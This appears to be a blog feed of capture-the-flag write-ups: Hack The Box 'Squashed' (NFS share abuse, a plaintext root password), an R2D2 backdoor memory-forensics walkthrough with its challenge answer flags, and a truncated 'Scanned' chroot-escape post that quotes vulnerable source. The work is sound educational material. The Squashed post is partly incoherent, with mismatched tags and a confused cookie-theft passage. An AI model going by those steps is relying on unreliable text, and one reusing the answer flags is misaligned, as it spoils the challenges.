[
  
  {
    "title": "Squashead - Hack The Box",
    "url": "/posts/htb-Squashed/",
    "categories": "hackthebox",
    "tags": "osticket, mysql, mattermost, hashcat, rules",
    "date": "2022-11-25 00:00:00 +0800",
    





    
    "snippet": "Squashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveragingmisconfigurations in NFS shares through impersonating users. Additionally, the box incorpo...",
    "content": "Squashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveragingmisconfigurations in NFS shares through impersonating users. Additionally, the box incorporates theenumeration of an X11 display into the privilege escalation by having the attacker take a screenshot of thecurrent Desktop.EnumarationPort Scannmap -sC -sV 10.10.11.191Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 11:12 ISTNmap scan report for 10.10.11.191Host is up (0.13s latency).Not shown: 996 closed tcp ports (conn-refused)PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-title: Built Better|_http-server-header: Apache/2.4.41 (Ubuntu)111/tcp  open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  3           2049/udp   nfs|   100003  3           2049/udp6  nfs|   100003  3,4         2049/tcp   nfs|   100003  3,4         2049/tcp6  nfs|   100005  1,2,3      45669/tcp6  mountd|   100005  1,2,3      50287/udp6  mountd|   100005  1,2,3      53317/tcp   mountd|   100005  1,2,3      54473/udp   mountd|   100021  1,3,4      33785/tcp6  nlockmgr|   100021  1,3,4      34763/tcp   nlockmgr|   100021  1,3,4      39022/udp   nlockmgr|   100021  1,3,4      50677/udp6  nlockmgr|   100227  3           2049/tcp   nfs_acl|   100227  3           2049/tcp6  nfs_acl|   100227  3           2049/udp   nfs_acl|_  100227  3           2049/udp6  nfs_acl2049/tcp open  nfs_acl 3 (RPC #100227)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 36.97 secondsThe nmap scan shows a standard SSH service running on port 22 , an Apache webserver running on port80 , as well as NFS and rpcbind running on their default portsEnumerating NFSNFS is a server/client  system enabling users to share files and directories across a network and allowingthose shares to be mounted locally. While both useful and versatile, NFS has no protocol for authorizationor authentication, making it a common pitfall for misconfiguration and therefore exploitation.We begin our enumeration by listing any potentially available shares hosted on the target machine.  showmount -e squashed.htbPort 22No anon login allowed so let’s move on.Port 80several html pages with nothing interesting. No subdirs, no subdomains.we see the how Beutifull Website developer made$ showmont -e 10.10.11.191Export list for 10.10.11.191/home/ross */var/www/html *Since we already saw whats in /html let’s dig into home folder first      sudo mount -t nfs 10.129.228.109:/home/ross    ~/Documents/htb/squashed -o nolock└─$ dir -lahtotal 68Kdrwxr-xr-x 14 ftpuser ftpgroup 4.0K Nov 19 09:21 .drwxr-xr-x 33 kali kali 4.0K Nov 19 09:20 ..lrwxrwxrwx 1 root root 9 Oct 20 09:24 .bash_history -&gt; /dev/nulldrwx - - - 11 ftpuser ftpgroup 4.0K Oct 21 10:57 .cachedrwx - - - 12 ftpuser ftpgroup 4.0K Oct 21 10:57 .configdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Desktopdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Documentsdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Downloadsdrwx - - - 3 ftpuser ftpgroup 4.0K Oct 21 10:57 .gnupgdrwx - - - 3 ftpuser ftpgroup 4.0K Oct 21 10:57 .localdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Musicdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Picturesdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Publicdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Templatesdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Videoslrwxrwxrwx 1 root root 9 Oct 21 09:07 .viminfo -&gt; /dev/null-rw - - - - 1 ftpuser ftpgroup 57 Nov 19 09:21 .Xauthority-rw - - - - 1 ftpuser ftpgroup 2.5K Nov 19 09:21 .xsession-errors-rw - - - - 1 ftpuser ftpgroup 2.5K Oct 31 06:13 .xsession-errors.oldDocuments contains a Passwords.kdbx, a keepass password databaseWhen listing the contents of /var/www/html , which is now mounted at /mnt/1 , it becomes evident thatwhile we can see filenames, we cannot see the files’ owners or permissions. That also means we cannotread the files’ contents or modify them whatsoever. We can, however, check the actual directory’spermissions by running ls on the folder itself.ls -ld /mnt/1We can see that the directory is owned by the UID 2017, and belongs to the group with the ID of www-data ,or 33 . This means that on the target box, i.e the server hosting the share, the directory is owned by a userwith that specific UID. We proceed to the second sharesudo mount -t nfs squashed.htb:/home/ross /mnt/2Following the blog we exfiltrate the cookie from our mounted share to our local attackbox and reupload it so we can use it with our alex user. Remember, we want to steal the session of ross so we have to do this on the victim.After trying xrdp for a while I checked the other xtools. https://clearlinux.org/software/bundle/x11-toolsxwd allows us to take a screenshot of the current session, this is a good start.we found the password root  cah$mei7rai9Aso we can connect with ssh"
  },
  
  {
    "title": "R2D2 Backdoor - Memory Forensics",
    "url": "/posts/CyberConFinals/",
    "categories": "CTF-TIME",
    "tags": "volatility, r2d2 backdoor",
    "date": "2022-11-15 00:00:00 +0800",
    





    
    "snippet": "Hey all and welcome once more to my blog. This past weekend i had the privilege to create a forensics challenge for the CyberCon Finals CTF which was held at USIU University. Top 4 Proffesional tea...",
    "content": "Hey all and welcome once more to my blog. This past weekend i had the privilege to create a forensics challenge for the CyberCon Finals CTF which was held at USIU University. Top 4 Proffesional teams and 10 University teams battled out different challenges ranging from: Web, Forensics, Pwn, Reverse Engineering. Anyway, i didn’t have enough time to properly setup a challenge from scratch, so i resolved to create some questions on a memory sample containing some nasty backdoor i was analyzing sometime back. I was happy to see folks solve most of the challenges and almost comming to the same conclusion i had before. With that said, i will be sharing my thought process on how the challenges were meant to be solved.So, what is a memory dump? Simply put, a memory dump (also known as a core dump or system dump) is a snapshot capture of computer memory data from a specific instant. A memory dump can contain valuable forensics data about the state of the system before an incident such as a crash or security compromise.  Memory forensics can provide unique insights into runtime system activity, including open network connections and recently executed commands or processes. In many cases, critical data pertaining to attacks or threats will exist solely in system memory – examples include network connections, account credentials, chat messages, encryption keys, running processes, injected code fragments, and internet history which is non-cacheable. Any program – malicious or otherwise – must be loaded in memory in order to execute, making memory forensics critical for identifying otherwise obfuscated attacks. ~Source: DigitalGuardianFirst, you unzip the provided memory sample. Password: infectedTo answer the first question, you were only required to get the md5sum of the .vmem file. This was as easy as:➜  md5sum malware.vmemcb47af710c7ab59e43d1396aa7ce950c  malware.vmemMoving on, we can use a tool like volatility to analyze the memory dump.Other tools you can explore on memory forensics include:  Rekall Framework  RedlineFirst, you need to find more information about the dump you are analying such as the image profile to use. To do so, you can use the imageinfo plugin or kdbgscan.➜  python2 vol.py -f malware.vmem imageinfoVolatility Foundation Volatility Framework 2.6.1INFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)                     AS Layer2 : FileAddressSpace (/home/kali/Desktop/CyberCON/malware.vmem)                      PAE type : PAE                           DTB : 0x319000L                          KDBG : 0x80544ce0L          Number of Processors : 1     Image Type (Service Pack) : 2                KPCR for CPU 0 : 0xffdff000L             KUSER_SHARED_DATA : 0xffdf0000L           Image date and time : 2011-10-10 17:06:54 UTC+0000     Image local date and time : 2011-10-10 13:06:54 -0400With that determined, you can begin investigating the processes running on the target system by using the pslist plugin.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 pslistVolatility Foundation Volatility Framework 2.6.1Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------0x819cc830 System                    4      0     55      162 ------      00x81945020 smss.exe                536      4      3       21 ------      0 2011-10-10 17:03:56 UTC+00000x816c6020 csrss.exe               608    536     11      355      0      0 2011-10-10 17:03:58 UTC+00000x813a9020 winlogon.exe            632    536     24      533      0      0 2011-10-10 17:03:58 UTC+00000x816da020 services.exe            676    632     16      261      0      0 2011-10-10 17:03:58 UTC+00000x813c4020 lsass.exe               688    632     23      336      0      0 2011-10-10 17:03:58 UTC+00000x81772ca8 vmacthlp.exe            832    676      1       24      0      0 2011-10-10 17:03:59 UTC+00000x8167e9d0 svchost.exe             848    676     20      194      0      0 2011-10-10 17:03:59 UTC+00000x817757f0 svchost.exe             916    676      9      217      0      0 2011-10-10 17:03:59 UTC+00000x816c6da0 svchost.exe             964    676     63     1058      0      0 2011-10-10 17:03:59 UTC+00000x815daca8 svchost.exe            1020    676      5       58      0      0 2011-10-10 17:03:59 UTC+00000x813aeda0 svchost.exe            1148    676     12      187      0      0 2011-10-10 17:04:00 UTC+00000x817937e0 spoolsv.exe            1260    676     13      140      0      0 2011-10-10 17:04:00 UTC+00000x81754990 VMwareService.e        1444    676      3      145      0      0 2011-10-10 17:04:00 UTC+00000x8136c5a0 alg.exe                1616    676      7       99      0      0 2011-10-10 17:04:01 UTC+00000x815c4da0 wscntfy.exe            1920    964      1       27      0      0 2011-10-10 17:04:39 UTC+00000x813bcda0 explorer.exe           1956   1884     18      322      0      0 2011-10-10 17:04:39 UTC+00000x816d63d0 VMwareTray.exe          184   1956      1       28      0      0 2011-10-10 17:04:41 UTC+00000x8180b478 VMwareUser.exe          192   1956      6       83      0      0 2011-10-10 17:04:41 UTC+00000x818233c8 reader_sl.exe           228   1956      2       26      0      0 2011-10-10 17:04:41 UTC+00000x815e7be0 wuauclt.exe             400    964      8      173      0      0 2011-10-10 17:04:46 UTC+00000x817a34b0 cmd.exe                 544   1956      1       30      0      0 2011-10-10 17:06:42 UTC+0000No process looks suspicious at this point. We can take this a notch higher and use the pstree plugin to print process list as a tree. This would make you understand which process triggered other processes.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 pstreeVolatility Foundation Volatility Framework 2.6.1Name                                                  Pid   PPid   Thds   Hnds Time-------------------------------------------------- ------ ------ ------ ------ ---- 0x819cc830:System                                      4      0     55    162 1970-01-01 00:00:00 UTC+0000. 0x81945020:smss.exe                                 536      4      3     21 2011-10-10 17:03:56 UTC+0000.. 0x816c6020:csrss.exe                               608    536     11    355 2011-10-10 17:03:58 UTC+0000.. 0x813a9020:winlogon.exe                            632    536     24    533 2011-10-10 17:03:58 UTC+0000... 0x816da020:services.exe                           676    632     16    261 2011-10-10 17:03:58 UTC+0000.... 0x817757f0:svchost.exe                           916    676      9    217 2011-10-10 17:03:59 UTC+0000.... 0x81772ca8:vmacthlp.exe                          832    676      1     24 2011-10-10 17:03:59 UTC+0000.... 0x816c6da0:svchost.exe                           964    676     63   1058 2011-10-10 17:03:59 UTC+0000..... 0x815c4da0:wscntfy.exe                         1920    964      1     27 2011-10-10 17:04:39 UTC+0000..... 0x815e7be0:wuauclt.exe                          400    964      8    173 2011-10-10 17:04:46 UTC+0000.... 0x8167e9d0:svchost.exe                           848    676     20    194 2011-10-10 17:03:59 UTC+0000.... 0x81754990:VMwareService.e                      1444    676      3    145 2011-10-10 17:04:00 UTC+0000.... 0x8136c5a0:alg.exe                              1616    676      7     99 2011-10-10 17:04:01 UTC+0000.... 0x813aeda0:svchost.exe                          1148    676     12    187 2011-10-10 17:04:00 UTC+0000.... 0x817937e0:spoolsv.exe                          1260    676     13    140 2011-10-10 17:04:00 UTC+0000.... 0x815daca8:svchost.exe                          1020    676      5     58 2011-10-10 17:03:59 UTC+0000... 0x813c4020:lsass.exe                              688    632     23    336 2011-10-10 17:03:58 UTC+0000 0x813bcda0:explorer.exe                             1956   1884     18    322 2011-10-10 17:04:39 UTC+0000. 0x8180b478:VMwareUser.exe                           192   1956      6     83 2011-10-10 17:04:41 UTC+0000. 0x817a34b0:cmd.exe                                  544   1956      1     30 2011-10-10 17:06:42 UTC+0000. 0x816d63d0:VMwareTray.exe                           184   1956      1     28 2011-10-10 17:04:41 UTC+0000. 0x818233c8:reader_sl.exe                            228   1956      2     26 2011-10-10 17:04:41 UTC+0000At this point we see explorer.exe (PID: 1956) spawning VMwareUser.exe , cmd.exe ( Suspicious) , VMwareTray.exe &amp; reader_sl.exe ( Suspicious). My thinking, The user probably opened a malicious pdf file that spawned cmd and finally Adobe reader to view it. We can use the cmdscan plugin to extract command history as shown:➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 cmdscanVolatility Foundation Volatility Framework 2.6.1**************************************************CommandProcess: csrss.exe Pid: 608CommandHistory: 0x11132d8 Application: cmd.exe Flags: Allocated, ResetCommandCount: 2 LastAdded: 1 LastDisplayed: 1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x4c4Cmd #0 @ 0x4e1eb8: sc query malwarCmd #1 @ 0x11135e8: sc query malwareWe see sc query malware command was executed.  The sc command is used to configure, query, stop, start, delete, and add system services on the Windows command line.In our case, the command seems to be querying a service called malware. The first command entry looks like a typo though.Similar to cmdscan the consoles plugin finds commands that attackers typed into cmd.exe or executed via backdoors. The major advantage to this plugin is it not only prints the commands attackers typed, but it collects the entire screen buffer (input and output). For instance, lets see what output was generated when sc query malware command was executed.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 consolesVolatility Foundation Volatility Framework 2.6.1**************************************************ConsoleProcess: csrss.exe Pid: 608Console: 0x4e2370 CommandHistorySize: 50HistoryBufferCount: 2 HistoryBufferMax: 4OriginalTitle: %SystemRoot%\\system32\\cmd.exeTitle: C:\\WINDOWS\\system32\\cmd.exeAttachedProcess: cmd.exe Pid: 544 Handle: 0x4c4----CommandHistory: 0x1113498 Application: sc.exe Flags:CommandCount: 0 LastAdded: -1 LastDisplayed: -1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x0----CommandHistory: 0x11132d8 Application: cmd.exe Flags: Allocated, ResetCommandCount: 2 LastAdded: 1 LastDisplayed: 1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x4c4Cmd #0 at 0x4e1eb8: sc query malwarCmd #1 at 0x11135e8: sc query malware----Screen 0x4e2a70 X:80 Y:300Dump:Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\Documents and Settings\\Administrator&gt;sc query malwar[SC] EnumQueryServicesStatus:OpenService FAILED 1060:The specified service does not exist as an installed service.C:\\Documents and Settings\\Administrator&gt;sc query malwareSERVICE_NAME: malware        TYPE               : 1  KERNEL_DRIVER        STATE              : 4  RUNNING                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)        WIN32_EXIT_CODE    : 0  (0x0)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x0C:\\Documents and Settings\\Administrator&gt;More information about the service can be queried using the svcscan plugin. This plugin gives more detail to the running processes in the event that the analyst requires additional details such as the display name, binary path, or service type.We see that the service is running. Next thing we can try establish if there were network connections. Using connscan plugin, we see➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 connscanVolatility Foundation Volatility Framework 2.6.1Offset(P)  Local Address             Remote Address            Pid---------- ------------------------- ------------------------- ---0x01a25a50 0.0.0.0:1026              172.16.98.1:6666          1956We can detect listening sockets for any protocol (TCP, UDP, RAW, etc), using the sockets plugin.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 socketsVolatility Foundation Volatility Framework 2.6.1Offset(V)       PID   Port  Proto Protocol        Address         Create Time---------- -------- ------ ------ --------------- --------------- -----------0x8177e3c0     1956   1026      6 TCP             0.0.0.0         2011-10-10 17:04:39 UTC+00000x81596a78      688    500     17 UDP             0.0.0.0         2011-10-10 17:04:00 UTC+00000x8166a008      964   1029     17 UDP             127.0.0.1       2011-10-10 17:04:42 UTC+00000x818ddc08        4    445      6 TCP             0.0.0.0         2011-10-10 17:03:55 UTC+00000x818328d8      916    135      6 TCP             0.0.0.0         2011-10-10 17:03:59 UTC+00000x81687e98     1616   1025      6 TCP             127.0.0.1       2011-10-10 17:04:01 UTC+00000x817517e8      964    123     17 UDP             127.0.0.1       2011-10-10 17:04:00 UTC+00000x81753b20      688      0    255 Reserved        0.0.0.0         2011-10-10 17:04:00 UTC+00000x8174fe98     1148   1900     17 UDP             127.0.0.1       2011-10-10 17:04:41 UTC+00000x81753008      688   4500     17 UDP             0.0.0.0         2011-10-10 17:04:00 UTC+00000x816118d8        4    445     17 UDP             0.0.0.0         2011-10-10 17:03:55 UTC+0000Moving on, there was a question asking about the computer name and OS version. This information can be found using the envars plugin. Typically this will show the number of CPUs installed and the hardware architecture (though the kdbgscan output is a much more reliable source), the process’s current directory, temporary directory, session name, computer name, user name, and various other interesting artifacts.But what really triggered PID 1956? My hypothesis was that the user opened suspicious PDF documents that led to cmd &amp; Adobe reader spawning. We also saw a network connection linked to this process. Using the iehistory plugin we can recover fragments of IE history index.dat cache files. It can find basic accessed links (via FTP or HTTP), redirected links (–REDR), and deleted entries (–LEAK). It applies to any process which loads and uses the wininet.dll library, not just Internet Explorer. Typically that includes Windows Explorer and even malware samples. For more info about the same, you can read this blog postFrom the above, we see two suspicious pdf documents linked to the same process: listener.pdf &amp; Exploit.pdfLets scan for malicious drivers loaded, and moreso any that contains the malware string or name.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 driverscan | grep \"malware\"Volatility Foundation Volatility Framework 2.6.1Offset(P)          #Ptr #Hnd Start                            Size Service Key          Name         Driver Name------------------ ---- ---- ------------------ ------------------ -------------------- ------------ -----------0x0000000001a498b8        3        0 0xf9eb4000     0x1500 malware              malware      \\Driver\\malwareTo extract a kernel driver to a file, use the moddump pluggin. Supply the output directory with -D or –dump-dir=DIR.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 moddump -b 0xf9eb4000 --dump-dir=$PWDVolatility Foundation Volatility Framework 2.6.1Module Base Module Name          Result----------- -------------------- ------0x0f9eb4000 winsys32.sys         OK: driver.f9eb4000.sysWe can get its md5sum and check if its flagged by VT➜  md5sum driver.f9eb4000.sys63270d2354695cabde0baeb0aed60e2a  driver.f9eb4000.sysFrom the VT - driver.f9eb4000.sys Analysis, we find 53/71 vendors flagged this file as malicious. We also learn that it linked with R2D2 backdoor.Running strings on the malicious driver, we find another interesting dll referenced. Doing a quick google search on the same, we still get hits on R2D2 backdoor.Lets find out if the dll is used by explorer.exe. To display a process’s loaded DLLs, use the dlllist plugin with the -p or --pid filter as shown below.From the output shown above, we see mfc42ul.dll has a wierd base address compared to the rest (0x10000000). What we can do is extract the DLL from the process’s memory space and dump it to disk for analysis as shown below:➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 moddump -b 0x10000000 --dump-dir=$PWDVolatility Foundation Volatility Framework 2.6.1Module Base Module Name          Result----------- -------------------- ------0x010000000 UNKNOWN              OK: driver.10000000.sys➜  md5sum driver.10000000.sys4986f678160ccd516f2bd589719ea0c4  driver.10000000.sysDoing a quick check on VirusTotal, we see 46/68 flagged this file as malicious.I did some research on this backdoor and came across this report by the Chaos Computer Club (CCC), a long-established German hacker group that claimed that the German government may have unleashed a backdoor Trojan Horse program, allowing them to spy on its people. While running strings on the suspicious dll (mfc42ul.dll), i noticed some wierd string, C3PO-r2d2-POE. Starwars characters? I don’t know.From CCC’s report, i learnt that the backdoor was dubbed “R2D2” due to the “C3PO-r2d2-POE” string located inside the Trojan. CCC claims that it allows the monitoring Internet activity, including the recording of MSN Messenger conversations, Skype calls and Yahoo messenger chat.That wraps up my analysis of the R2D2 backdoor, atleast for the context of the CTF. Upon completion of my analysis, I stumbled upon several blog posts documenting analysis of the same sample. Please check them out!  Invoke-IR - R2D2 Memory Sample Analysis   ka1d0 - Analyzing Memory Dumps — R2D2 Malware  Skills that matter - Hunting R2D2 Malware  evild3ad - Federal Trojan aka R2D2If anyone has additional details that i might have missed, or has any feedback to improve my methodology it would be greatly appreciated.Questions  What is the md5sum of the memory sample (50pts)ccke{cb47af710c7ab59e43d1396aa7ce950c}  What is the computer name of the machine captured (50pts)ccke{GENERALLEE}  What is the name of the OS from which the memory sample was captured from? (50pts)ccke{Windows_NT}  What process triggered a series of suspicious processes? (50pts)ccke{1956}  What Remote Address and Port was the victim machine communicating with? (50pts)ccke{172.16.98.1:6666}  There are two suspicious PDFs that were likely opened. Can you find their names? (50pts)ccke{listener.pdf,Exploit.pdf}  What is the md5sum of the malicious dll? (300pts)ccke{4986f678160ccd516f2bd589719ea0c4}  What is the md5sum of the malicious driver? (300pts)ccke{63270d2354695cabde0baeb0aed60e2a}  What is the name of this backdoor? (100pts)ccke{R2D2} or ccke{r2d2}"
  },
  
  {
    "title": "Hack The Box - Scanned",
    "url": "/posts/scanned/",
    "categories": "HackTheBox",
    "tags": "linux, insane, kernel, pwn, c, coding, chroot, jail, sandbox",
    "date": "2022-09-10 00:00:00 +0800",
    





    
    "snippet": "Scanned is an insane rated machine on HackTheBox created by clubby789. For the user part we will escape a chroot jail to read the database file of a web server giving us ssh access because of reuse...",
    "content": "Scanned is an insane rated machine on HackTheBox created by clubby789. For the user part we will escape a chroot jail to read the database file of a web server giving us ssh access because of reused credentials. To obtain root we will again fiddle with the chroot jail binary to call a suid binary using a backdored library and thus getting code execution as the root user.UserAs usual we start our enumeration with a nmap scan against all ports followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.All Ports$ sudo nmap -n -p- -T4 10.129.159.163Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 18:34 CETNmap scan report for 10.129.159.163Host is up (0.034s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 100.45 secondsScript and version$ sudo nmap -sC -sV -p22,80 -n 10.129.159.163Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 18:38 CETNmap scan report for 10.129.159.163Host is up (0.034s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)| ssh-hostkey:|   3072 6a:7b:14:68:97:01:4a:08:6a:e1:37:b1:d2:bd:8f:3f (RSA)|   256 f6:b4:e1:10:f0:7b:38:48:66:34:c2:c6:28:ff:b8:25 (ECDSA)|_  256 c9:8b:96:19:51:e7:ce:1f:7d:3e:44:e9:a4:04:91:09 (ED25519)80/tcp open  http    nginx 1.18.0|_http-title: Malware Scanner|_http-server-header: nginx/1.18.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.00 secondsThere are only two ports open on the machine with nginx running on port 80 seeming most promising for initial access. Opening the page in our browser we see an application that offers to scan malware in a chroot jail.The first link on the page http://10.129.159.163/scanner/upload leads to the upload form where we can submit a binary for scanning.The other link http://10.129.159.163/static/source.tar.gz let’s us download a source tar archive.The archive looks interesting so let’s download and unpack it.$ tar -xvf source.tar.gzmalscanner/malscanner/.gitignoremalscanner/malscanner/malscanner/malscanner.dbmalscanner/malscanner/__init__.pymalscanner/malscanner/__pycache__/malscanner/malscanner/__pycache__/__init__.cpython-39.pycmalscanner/malscanner/__pycache__/settings.cpython-39.pycmalscanner/malscanner/__pycache__/urls.cpython-39.pycmalscanner/malscanner/__pycache__/views.cpython-39.pycmalscanner/malscanner/__pycache__/wsgi.cpython-39.pycmalscanner/malscanner/asgi.pymalscanner/malscanner/settings.pymalscanner/malscanner/urls.pymalscanner/malscanner/views.pymalscanner/malscanner/wsgi.pymalscanner/manage.pymalscanner/requirements.txtmalscanner/sandbox/malscanner/sandbox/jails/malscanner/sandbox/sandboxmalscanner/scanner/malscanner/scanner/__init__.pymalscanner/scanner/__pycache__/malscanner/scanner/__pycache__/__init__.cpython-39.pycmalscanner/scanner/__pycache__/forms.cpython-39.pycmalscanner/scanner/__pycache__/urls.cpython-39.pycmalscanner/scanner/__pycache__/views.cpython-39.pycmalscanner/scanner/admin.pymalscanner/scanner/apps.pymalscanner/scanner/forms.pymalscanner/scanner/tests.pymalscanner/scanner/urls.pymalscanner/scanner/views.pymalscanner/static/malscanner/static/source.tar.gzmalscanner/templates/malscanner/templates/index.htmlmalscanner/templates/upload.htmlmalscanner/templates/view.htmlmalscanner/uploads/malscanner/uwsgi_paramsmalscanner/viewer/malscanner/viewer/__init__.pymalscanner/viewer/__pycache__/malscanner/viewer/__pycache__/__init__.cpython-39.pycmalscanner/viewer/__pycache__/syscalls.cpython-39.pycmalscanner/viewer/__pycache__/urls.cpython-39.pycmalscanner/viewer/__pycache__/views.cpython-39.pycmalscanner/viewer/admin.pymalscanner/viewer/apps.pymalscanner/viewer/syscalls.pymalscanner/viewer/tests.pymalscanner/viewer/urls.pymalscanner/viewer/views.pysandbox/sandbox/.gitignoresandbox/Makefilesandbox/copy.csandbox/jails/sandbox/sandbox.csandbox/tracing.cLooking at the source code of the upload form we see what happens with our uploaded binary.  First it generates a md5 hash of our uploaded file writes it to disk and runs it with a  sandbox executable.malscanner/scanner/views.pyfrom django.http import HttpResponse, HttpResponseRedirectfrom django.shortcuts import renderfrom django.conf import settingsfrom django_file_md5 import calculate_file_md5from .forms import UploadFileFormimport osdef index(request):    return HttpResponse(\"Hello, world. You're at the polls index.\")def upload_file(request):    if request.method == 'POST':        form = UploadFileForm(request.POST, request.FILES)        if form.is_valid():            md5 = handle_file(request.FILES['file'])            return HttpResponseRedirect(f'/viewer/{md5}')        else:            return HttpResponse(\"Invalid form\")    else:        return render(request, 'upload.html', {'form': UploadFileForm()})def handle_file(file):    md5 = calculate_file_md5(file)    path = f\"{settings.FILE_PATH}/{md5}\"    with open(path, 'wb+') as f:        for chunk in file.chunks():            f.write(chunk)    os.system(f\"cd {settings.SBX_PATH}; ./sandbox {path} {md5}\")    os.remove(path)    return md5The viewer seems to return some syscalls that happened during execution.malscanner/viewer/views.pyfrom django.shortcuts import renderfrom django.conf import settingsfrom django.http import Http404, HttpResponsefrom .syscalls import LoggedSyscall, SyscallClassimport os.pathimport structdef view_file(request, md5: str):    path = f\"{settings.SBX_PATH}/jails/{md5}\"    if not os.path.exists(path):        raise Http404(\"A sample with this hash has not been uploaded.\")    logfile = f\"{path}/log\"    if not os.path.exists(logfile):        return HttpResponse(\"There was an error logging this application\")    syscalls = [call.render() for call in parse_log(logfile)]    ignore = list(filter(lambda call: call[0] == SyscallClass.Ignore, syscalls))    low = list(filter(lambda call: call[0] == SyscallClass.Low, syscalls))    med = list(filter(lambda call: call[0] == SyscallClass.Medium, syscalls))    high = list(filter(lambda call: call[0] == SyscallClass.High, syscalls))    render_vars = {\"md5\": md5, \"ignore\": ignore, \"low\": low, \"med\": med, \"high\": high}    return render(request, 'view.html', render_vars)def parse_log(path):    syscalls = []    with open(path, 'rb') as f:        chunk = f.read(8 * 8)        nums = struct.unpack(\"q\" * 8, chunk)        while len(chunk) == 8*8:            nums = struct.unpack(\"q\" * 8, chunk)            call = LoggedSyscall(nums)            syscalls.append(call)            chunk = f.read(8 * 8)    return syscallsmalscanner/viewer/syscalls.pyIn the source.tar.gz the code for sandbox is also included.find .../.gitignore./Makefile./tracing.c./sandbox.c./jails./copy.cLooking at the Makefile we see it creates the jails directory upon building. Furthermore the finished binary get’s the cap_setuid capability set which looks very promising in a successful exploit scenario.Makefile.PHONY: all cleanall: sandboxjails:\tmkdir jails; chmod 0771 jailssandbox: jails sandbox.c copy.c tracing.c\tgcc sandbox.c copy.c tracing.c -static -o sandbox\tsudo setcap 'cap_setpcap,cap_sys_admin,cap_setuid,cap_setgid,cap_sys_chroot=+eip' ./sandboxclean:\tfor i in $(shell find jails -maxdepth 2 -name proc); do sudo umount $$i; done\trm -rf sandbox jails/*Going through the source code we start in the main function of the program. The binary expects at least one argument else it exits and the argument has to start with /.  The flow continues by calling the check_cap() function.sandbox.c/mainint main(int argc, char** argv) {    if (argc &lt; 2) {        printf(\"Usage: %s &lt;program&gt; [uuid]\\n\", argv[0]);        exit(-2);    }    if (strlen(argv[1]) &gt; FILENAME_MAX - 50) {        DIE(\"Program name too long\");    }    if ((argv[1][0]) != '/') {        DIE(\"Program path must be absolute\");    }    umask(0);    check_caps();    int result = mkdir(\"jails\", 0771);    if (result == -1 &amp;&amp; errno != EEXIST) {        DIE( \"Could not create jail directory\");    }    char uuid[33] = {0};    if (argc &lt; 3) {        generate_uuid(uuid);    } else {        memcpy(uuid, argv[2], 32);    }    uuid[32] = 0;    make_jail(uuid, argv[1]);}Inside the function the current capabilities of the process are retrieved and if they aren’t sufficient to pass the check the program exits. Since we cannot change the capabilities on the remote binary unless we have root access this check is irrelevant for us unless building the binary ourselves.sandbox.c/check_capsstruct user_cap_header_struct {    int version;    pid_t pid;};struct user_cap_data_struct {    unsigned int effective;    unsigned int permitted;    unsigned int inheritable;};int copy(const char* src, const char* dst);void do_trace();int jailsfd = -1;#define DIE(err) fprintf(stderr, err \": (%d)\\n\", errno); exit(-1)...[snip]...// Check we have all required capabilitiesvoid check_caps() {    struct user_cap_header_struct header;    struct user_cap_data_struct caps;    char pad[32];    header.version = _LINUX_CAPABILITY_VERSION_3;    header.pid = 0;    caps.effective = caps.inheritable = caps.permitted = 